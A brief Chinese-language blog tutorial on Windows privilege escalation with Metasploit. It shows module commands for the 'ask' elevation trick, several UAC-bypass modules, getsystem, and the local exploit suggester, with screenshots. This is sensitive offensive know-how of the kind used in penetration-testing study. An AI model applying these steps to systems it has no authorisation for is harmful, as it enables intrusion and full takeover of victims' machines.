---
title: MSF提权
top: true
cover: true
toc: true
mathjax: true
date: 2020-10-22 21:04:04
password: xxxxx
summary: 权限提升
tags: 权限提升
categories: 权限提升
---

---

### **MSF权限提升**

#### **方法：**

- 提高程序运行级别
- BypassUAC
- 利用漏洞提权

 一、提高程序运行权限

获取到session后发现权限比较低，此时可以使用  exploit/windows/local/ask模块来尝试进行攻击

![image-20201022225705503](MSF提权/image-20201022225705503.png)

```
set session 1
set filename qq.exe
exploit
```

![image-20201022211517291](MSF提权/image-20201022211517291.png)



获取到新的session，backkground退回msf，session，执行getsystem

![image-20201022212015935](MSF提权/image-20201022212015935.png)

![image-20201022212235253](MSF提权/image-20201022212235253.png)

![image-20201022212618886](MSF提权/image-20201022212618886.png)

二、UAC绕过

相关模块

```
exploit/windows/local/bypassuac
exploit/windows/local/bypassuac_injection
exploit/windows/local/bypassuac_vbs
exploit/windows/local/bypassuac_eventvwr 
```

bypassuac，先bypassuac在通过getsystem获取一个更高权限的session

![image-20201022215103702](MSF提权/image-20201022215103702.png)

![image-20201022215139866](MSF提权/image-20201022215139866.png)



三、利用漏洞提权

相关模块

自动查找响应系统提权exp，search suggester这个模块



```
use post/multi/recon/local_exploit_suggester
set session id
run
```

![image-20201022220516950](MSF提权/image-20201022220516950.png)

然后利用相关exp尝试提权



----